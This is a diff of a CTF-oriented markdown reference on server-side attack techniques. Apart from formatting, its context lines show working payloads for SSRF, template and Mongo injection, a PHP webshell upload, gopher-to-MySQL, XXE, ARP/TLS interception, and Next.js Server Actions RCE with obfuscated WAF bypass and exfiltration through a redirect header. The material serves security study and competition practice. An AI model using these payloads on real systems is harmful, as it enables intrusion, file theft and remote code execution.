@@ -1,7 +1,6 @@
 # Server-Side Advanced Techniques (Part 4)
 
 ## Table of Contents
-
 - [WeasyPrint SSRF & File Read (CVE-2024-28184, Nullcon 2026)](#weasyprint-ssrf--file-read-cve-2024-28184-nullcon-2026)
   - [Variant 1: Blind SSRF via Attachment Oracle](#variant-1-blind-ssrf-via-attachment-oracle)
   - [Variant 2: Local File Read via file:// Attachment](#variant-2-local-file-read-via-file-attachment)
@@ -24,18 +23,16 @@
 
 See also: [server-side-advanced.md](server-side-advanced.md) for Part 1 (ExifTool DjVu, Go rune/byte, ZIP symlink, path traversal bypasses, Nginx alias, Unicode homoglyph, Ruby Regexp.escape, /dev/fd, Flask/Werkzeug debug, XXE DTD filter bypass, %2f bypass). See also: [server-side-advanced-2.md](server-side-advanced-2.md) for Part 2. See also: [server-side-advanced-3.md](server-side-advanced-3.md) for Part 3.
 
-------
+---
 
 ## WeasyPrint SSRF & File Read (CVE-2024-28184, Nullcon 2026)
 
 **Pattern (Web 2 Doc 1/2):** App converts user-supplied URL to PDF using WeasyPrint. Attachment fetches bypass internal header checks and can read local files.
 
 ### Variant 1: Blind SSRF via Attachment Oracle
-
 WeasyPrint `<a rel="attachment" href="...">` fetches the URL in a separate codepath without `X-Fetcher` or similar internal headers. If the target is localhost-only, the attachment fetch succeeds from localhost.
 
 **Boolean oracle:** Embedded file appears in PDF only when target returns HTTP 200:
-
 ```python
 # Check for embedded attachment in PDF
 def has_attachment(pdf_bytes):
@@ -51,32 +48,27 @@ for i in range(flag_len):
 ```
 
 ### Variant 2: Local File Read via file:// Attachment
-
 ```html
 <!-- Host this HTML, submit URL to converter -->
 <link rel="attachment" href="file:///flag.txt">
 ```
-
 **Extract:** `pdfdetach -save 1 -o flag.txt output.pdf`
 
 **Key insight:** WeasyPrint processes `<link rel="attachment">` and `<a rel="attachment">` -- both can reference `file://` or internal URLs. The attachment is embedded in the PDF as a file stream.
 
-------
+---
 
 ## MongoDB Regex Injection / $where Blind Oracle (Nullcon 2026)
 
 **Pattern (CVE DB):** Search input interpolated into `/.../i` regex in MongoDB query. Break out of regex to inject arbitrary JS conditions.
 
 **Injection payload:**
-
 ```text
 a^/)||(<JS_CONDITION>)&&(/a^
 ```
-
 This breaks the regex context and injects a boolean condition. Result count reveals truth value.
 
 **Binary search extraction:**
-
 ```python
 def oracle(condition):
     # Inject into regex context
@@ -104,20 +96,18 @@ for i in range(length):
 
 **Detection:** Unsanitized input in MongoDB `$regex` or `$where`. Test with `a/)||true&&(/a` vs `a/)||false&&(/a` -- different result counts confirm injection.
 
-------
+---
 
 ## Pongo2 / Go Template Injection via Path Traversal (Nullcon 2026)
 
 **Pattern (WordPress Static Site Generator):** Go app renders templates with Pongo2. Template parameter has path traversal allowing rendering of uploaded files.
 
 **Attack chain:**
-
 1. Upload file containing: `{% include "/flag.txt" %}`
 2. Get upload ID from session cookie (base64 decode, extract hex ID)
 3. Request render with traversal: `/generate?template=../uploads/<id>/pwn`
 
 **Pongo2 SSTI payloads:**
-
 ```text
 {% include "/etc/passwd" %}
 {% include "/flag.txt" %}
@@ -126,14 +116,13 @@ for i in range(length):
 
 **Detection:** Go web app with template rendering + file upload. Check for `pongo2`, `jet`, or standard `html/template` in source.
 
-------
+---
 
 ## ZIP Upload with PHP Webshell (Nullcon 2026)
 
 **Pattern (virus_analyzer):** App accepts ZIP uploads, extracts to web-accessible directory, serves extracted files.
 
 **Exploit:**
-
 ```bash
 # Create PHP webshell
 echo '<?php echo file_get_contents("/flag.txt"); ?>' > shell.php
@@ -143,19 +132,17 @@ curl -F 'zipfile=@payload.zip' http://target/
 ```
 
 **Variants:**
-
 - If `system()` blocked ("Cannot fork"), use `file_get_contents()` or `readfile()`
 - If `.php` blocked, try `.phtml`, `.php5`, `.phar`, or upload `.htaccess` first
 - Race condition: file may be deleted after extraction -- access immediately
 
-------
+---
 
 ## basename() Bypass for Hidden Files (Nullcon 2026)
 
 **Pattern (Flowt Theory 2):** App uses `basename()` to prevent path traversal in file viewer, but it only strips directory components. Hidden/dot files in the same directory are still accessible.
 
 **Exploit:**
-
 ```bash
 # basename() allows .lock, .htaccess, etc.
 curl "http://target/?view_receipt=.lock"
@@ -165,7 +152,7 @@ curl "http://target/?view_receipt=secret_XXXXXXXX"
 
 **Key insight:** `basename()` is NOT a security function -- it only extracts the filename component. It doesn't filter hidden files (`.foo`), backup files (`file~`), or any filename without directory separators.
 
-------
+---
 
 ## wget CRLF Injection for SSRF-to-SMTP (SECCON 2017)
 
@@ -207,7 +194,7 @@ requests.post("http://target/fetch", data={"url": ssrf_url})
 
 **Key insight:** wget before 1.17.1 did not sanitize CRLF in the Host header. When SSRF reaches an internal SMTP service, CRLF injection enables sending arbitrary emails. Place the port at the END of the injected string to avoid "Bad port number" errors. This technique extends to any line-based protocol accessible via SSRF (FTP, Redis, memcached). See also [server-side.md](server-side.md#ssrf) for other SSRF techniques.
 
-------
+---
 
 ## Gopher SSRF to MySQL Blind SQLi (34C3 CTF 2017, AceBear 2018)
 
@@ -270,7 +257,7 @@ print(f"Final flag: {flag}")
 
 **Key insight:** `gopher://` sends raw TCP data, enabling communication with any TCP service. Capture a legitimate MySQL session with `tcpdump`, then replay the auth + query bytes via gopher. Use passwordless MySQL accounts (common in CTF setups). Double-URL-encode the payload when the SSRF handler URL-decodes once. This technique also works against PostgreSQL, Redis, and other TCP services accessible from the SSRF context. See also [sql-injection.md](sql-injection.md) for SQL injection techniques.
 
-------
+---
 
 ## React Server Components Flight Protocol RCE (Ehax 2026)
 
@@ -279,7 +266,6 @@ print(f"Final flag: {flag}")
 ### Step 1 — Identify RSC via HTTP headers
 
 Intercept form submissions in the Network tab. RSC-specific headers:
-
 ```http
 POST / HTTP/1.1
 Next-Action: 7fc5b26191e27c53f8a74e83e3ab54f48edd0dbd
@@ -289,7 +275,6 @@ Content-Type: multipart/form-data; boundary=----x
 ```
 
 Confirm the server function name in client JS bundles:
-
 ```javascript
 createServerReference("7fc5b26191e27c53f8a74e83e3ab54f48edd0dbd", callServer, void 0, findSourceMapURL, "greetUser")
 ```
@@ -299,7 +284,6 @@ createServerReference("7fc5b26191e27c53f8a74e83e3ab54f48edd0dbd", callServer, vo
 Craft a fake Flight chunk in the multipart form body. The `_prefix` field contains the payload. The constructor chain (`constructor → constructor → Function`) enables arbitrary JavaScript execution on the server.
 
 Request structure:
-
 ```http
 POST / HTTP/1.1
 Host: target
@@ -329,14 +313,12 @@ throw Object.assign(new Error('NEXT_REDIRECT'), {
 ```
 
 The server responds with:
-
 ```http
 HTTP/1.1 303 See Other
 x-action-redirect: /login?a=<exfiltrated_data>;push
 ```
 
 Example — confirm RCE with `process.pid`:
-
 ```javascript
 throw Object.assign(new Error('NEXT_REDIRECT'), {
   digest: `NEXT_REDIRECT;push;/login?a=${process.pid};307;`
@@ -349,22 +331,17 @@ throw Object.assign(new Error('NEXT_REDIRECT'), {
 When keywords like `child_process`, `execSync`, `mainModule` are blocked (403 response with "WAF Alert"):
 
 1. **String concatenation:**
-
    ```javascript
    p['main'+'Module']['requ'+'ire']('chi'+'ld_pro'+'cess')
-   
    ```
 
 2. **Hex encoding:**
-
    ```javascript
    '\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73'  // child_process
    '\x65\x78\x65\x63\x53\x79\x6e\x63'                        // execSync
-   
    ```
 
 3. **Combined in payload:**
-
    ```javascript
    var p=process;
    var m=p['main'+'Module'];
@@ -373,7 +350,6 @@ When keywords like `child_process`, `execSync`, `mainModule` are blocked (403 re
    var o=c['\x65\x78\x65\x63\x53\x79\x6e\x63']('id').toString();
    throw Object.assign(new Error('NEXT_REDIRECT'),
      {digest:`NEXT_REDIRECT;push;/login?a=${encodeURIComponent(o)};307;`});
-   
    ```
 
 ### Step 5 — Post-RCE enumeration
@@ -393,13 +369,11 @@ process.mainModule.require('fs').readFileSync('vault.hint').toString('hex')
 
 // Check available modules
 Object.keys(process.mainModule.require('http'))
-
 ```
 
 ### Step 6 — Lateral movement to internal services
 
 After discovering internal services (e.g., from hint files):
-
 ```javascript
 // Use nc to reach internal HTTP services
 var p=process;var m=p['main'+'Module'];var r=m['requ'+'ire'];
@@ -409,7 +383,6 @@ var o=c['\x65\x78\x65\x63\x53\x79\x6e\x63'](
 ).toString();
 throw Object.assign(new Error('NEXT_REDIRECT'),
   {digest:`NEXT_REDIRECT;push;/login?a=${encodeURIComponent(o)};307;`});
-
 ```
 
 **Key insight:** The NEXT_REDIRECT mechanism provides a reliable out-of-band data exfiltration channel through the `x-action-redirect` response header. Combined with WAF bypass via string concatenation and hex encoding, this enables full RCE even in filtered environments.
@@ -418,7 +391,7 @@ throw Object.assign(new Error('NEXT_REDIRECT'),
 
 **Detection:** `Accept: text/x-component` + `Next-Action` header in requests, `createServerReference()` in client JS, Next.js Server Actions with user-controlled form data.
 
-------
+---
 
 ## AMQP/TLS Interception via sslsplit + arpspoof (TAMUctf 2019)
 
@@ -443,14 +416,13 @@ cat logdir/*    # shows plaintext AMQP frames with the JSON body
 #        tcp_message = tcp.TCPMessage(dst == server, x)
 mitmproxy --mode transparent --listen-port 1234 --ssl-insecure \
           --tcp-hosts 172.30.0.2 --tcp-hosts 172.30.0.4
-
 ```
 
 **Key insight:** Clients without certificate pinning accept any CA-signed cert; sslsplit terminates TLS and forwards plaintext to its log, so any TLS-wrapped protocol (AMQP, IRC, MQTT, LDAPS, custom binary) becomes observable and — with a trivial mitmproxy patch — modifiable. Burp and mitmproxy focus on HTTPS; for arbitrary protocols, reach for sslsplit/sslsniff plus a pinhole in the TCP layer.
 
 **References:** TAMUctf 2019 — Homework Help, writeup 13477
 
-------
+---
 
 ## CairoSVG XXE via Oversized width= (BSidesSF 2019)
 
@@ -462,7 +434,6 @@ mitmproxy --mode transparent --listen-port 1234 --ssl-insecure \
 <svg height="300" width="20000" xmlns="http://www.w3.org/2000/svg">
   <text x="0" y="15" fill="red">test &xx;; test</text>
 </svg>
-
 ```
 
 Upload, download the PNG, and read the flag off the image (eyeball or OCR). When hunting the flag path, dump `/proc/self/status` first to find the PID, then probe `/proc/<pid>/cwd/flag.txt`, `/proc/<pid>/cmdline`, and `/proc/<pid>/environ`. If the first pass clips (e.g. width=3000), re-render wider — BSidesSF 2019 SVGMagic landed the flag only at `width="3000"` because the target path was short.
@@ -471,7 +442,7 @@ Upload, download the PNG, and read the flag off the image (eyeball or OCR). When
 
 **References:** BSidesSF 2019 CTF — SVGMagic (PNGSVG), writeup 13711. See also the svglib variant in [server-side-2.md](server-side-2.md).
 
-------
+---
 
 ## Bazaar (.bzr) Repository Reconstruction via bzr check Loop (STEM CTF 2019)
 
@@ -502,7 +473,6 @@ bzr revert
 
 # 4. Mine every revision for interesting diffs
 for R in $(bzr log --line | awk '{print $1}'); do bzr diff -r$((R-1))..$R; done
-
 ```
 
 **Key insight:** Exposed `.bzr/` (or `.git/`, `.hg/`, `.svn/`) directories leak full commit history; bzr is particularly friendly because it tolerates partial repos and reports the missing path verbatim, so a wget-in-a-loop solver finishes the job. Always diff revisions, not just `HEAD` — flags, wallet keys, and decryption keys are often *removed* in a later commit but still recoverable. Once the tree is reconstructed you can chain with challenges like STEM CTF "Medium is overrated", where revision N stores a base64 ciphertext and revision M stores the AES-ECB key.
